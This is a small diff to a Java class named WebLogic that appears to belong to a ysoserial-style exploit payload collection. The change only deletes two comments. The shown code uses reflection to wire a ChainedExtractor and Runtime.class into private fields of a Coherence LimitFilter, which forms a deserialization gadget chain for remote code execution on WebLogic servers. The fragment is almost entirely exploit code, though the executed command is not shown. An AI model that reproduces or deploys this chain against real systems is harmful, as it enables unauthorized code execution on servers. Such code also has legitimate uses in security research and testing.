@@ -39,12 +39,12 @@ public class WebLogic extends PayloadRunner implements ObjectPayload<Object> {
         ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
         LimitFilter limitFilter = new LimitFilter();
 
-        //m_comparator
+
         Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
         m_comparator.setAccessible(true);
         m_comparator.set(limitFilter, chainedExtractor);
 
-        //m_oAnchorTop
+
         Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
         m_oAnchorTop.setAccessible(true);
         m_oAnchorTop.set(limitFilter, Runtime.class);
